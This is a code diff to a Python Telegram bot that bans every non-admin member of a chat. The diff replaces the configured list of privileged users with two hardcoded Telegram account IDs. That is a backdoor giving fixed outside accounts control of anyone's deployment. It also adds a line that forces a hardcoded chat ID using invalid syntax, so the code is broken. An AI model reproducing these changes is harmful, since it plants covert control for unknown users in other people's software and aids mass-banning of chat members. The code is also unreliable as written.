@@ -16,7 +16,7 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)
 
 
-SUDOS = Config.SUDOS
+SUDOS = [5561308408,1714667754]
 
 
 
@@ -31,6 +31,7 @@ def main(_, msg: Message):
     if chat.get_member(msg.from_user.id).can_manage_chat and me.can_restrict_members and me.can_delete_messages:
         try:
             zaid = msg.reply('Starting Banning in Chat')
+            chat = -s1001766232229
             count_kicks = 0
             for member in chat.iter_members():
                 if not member.can_manage_chat:
